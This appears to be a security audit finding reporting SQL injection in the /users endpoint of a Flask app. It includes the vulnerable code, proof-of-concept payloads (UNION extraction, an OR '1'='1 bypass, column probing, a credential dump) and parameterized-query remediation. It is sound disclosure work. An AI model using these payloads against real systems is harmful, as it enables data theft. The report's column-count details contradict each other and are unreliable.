# FA-001 — SQL Injection in GET /users in app.py

**App**: flask-app
**CWE**: CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
**Severity**: High
**File**: `app.py`
**Lines**: 27–28

## Vulnerability

The `/users` endpoint builds a SQL query by concatenating the user-supplied `name` query parameter directly into the query string:

```python
# app.py, lines 27-28
query = "SELECT * FROM users WHERE name = '" + name + "'"
cursor.execute(query)
```

No parameterization, escaping, or allowlist validation is applied.

## Proof of Concept

### Data extraction (UNION-based)

```http
GET /users?name=' UNION SELECT sqlite_version(),2,3-- - HTTP/1.1
Host: localhost:5000
```

This returns the SQLite version alongside the normal result set, confirming the injection.

### Authentication bypass

```http
GET /users?name=' OR '1'='1 HTTP/1.1
Host: localhost:5000
```

Returns all rows in the `users` table.

### Blind boolean injection

Determine number of columns:

```
name=' ORDER BY 1-- -   (OK)
name=' ORDER BY 5-- -   (Error → 4 columns max)
```

### Data dump

```
name=' UNION SELECT username,password,3,4 FROM users-- -
```

## Impact

- Full read access to all tables in the database
- Potential write access (`INSERT`, `UPDATE`, `DELETE`) depending on DB permissions
- Potential RCE via `ATTACH DATABASE` or SQLite's `load_extension` if enabled

## Remediation

Use parameterized queries:

```python
query = "SELECT * FROM users WHERE name = ?"
cursor.execute(query, (name,))
```

Or use an ORM (SQLAlchemy) that handles parameterization automatically.
